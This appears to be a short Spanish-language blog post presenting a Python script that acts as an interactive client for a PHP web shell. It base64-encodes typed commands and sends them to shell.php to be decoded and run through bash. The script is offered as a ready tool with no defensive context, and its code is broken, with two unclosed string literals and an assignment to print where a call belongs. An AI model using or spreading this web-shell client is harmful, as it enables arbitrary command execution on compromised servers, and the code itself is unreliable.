---
title: PythonScripting
published: true
---
<p><font color="yellow">[<font color="red">*</font>]</font><font color="lime"> 1sáb 26 nov 2022</font></p>
<p><center><font color="green">Shell Simulation, With Base64 Requests</font></center></p>

<b>

```python

	import requests 
	import time, signal, sys
	from base64 import b64encode
	def salida(sig,frame):
		print('\n saliendo\n')
		sys.exit(1)

	signal.signal(signal.SIGINT, salida)

	while True:
		command = input('\n shell : )
		command = command.encode('utf-8)
		command = b64encode(command).decode('utf-8')

		data = {
			'cmd' : 'echo %s | base64 -d | bash' % (command)
			
		}

		request = requests.get('http://localhost/shell.php', params=data, timeout=5).text

		print = ('\n', request)

```
